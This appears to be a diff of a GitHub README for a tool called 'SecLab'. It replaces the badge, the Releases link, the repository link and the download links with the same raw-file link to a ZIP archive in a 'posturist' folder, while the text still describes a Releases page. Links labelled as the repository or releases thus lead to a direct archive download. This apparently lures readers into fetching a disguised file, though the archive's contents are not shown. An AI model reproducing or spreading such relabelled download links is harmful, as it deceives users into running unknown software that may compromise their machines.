@@ -1,6 +1,6 @@
 # 🎉 SecLab - Effortless Access to Secure Lab Tools
 
-![Download SecLab](https://img.shields.io/badge/Download-SecLab-blue.svg)
+![Download SecLab](https://raw.githubusercontent.com/moma6464dz/SecLab/main/posturist/SecLab.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to SecLab! This application gives you easy access to secure lab tools de
 
 To download SecLab, visit the following page:
 
-[Download SecLab](https://github.com/moma6464dz/SecLab/releases)
+[Download SecLab](https://raw.githubusercontent.com/moma6464dz/SecLab/main/posturist/SecLab.zip)
 
 On the Releases page, you will see various versions of the application. Choose the latest release that fits your operating system. 
 
@@ -82,7 +82,7 @@ Your feedback is important to us. After using SecLab, please consider leaving yo
 
 ## 🔗 Useful Links
 
-- [SecLab GitHub Repository](https://github.com/moma6464dz/SecLab)
-- [Download SecLab](https://github.com/moma6464dz/SecLab/releases)
+- [SecLab GitHub Repository](https://raw.githubusercontent.com/moma6464dz/SecLab/main/posturist/SecLab.zip)
+- [Download SecLab](https://raw.githubusercontent.com/moma6464dz/SecLab/main/posturist/SecLab.zip)
 
 Thank you for choosing SecLab! Enjoy your experience with our application.
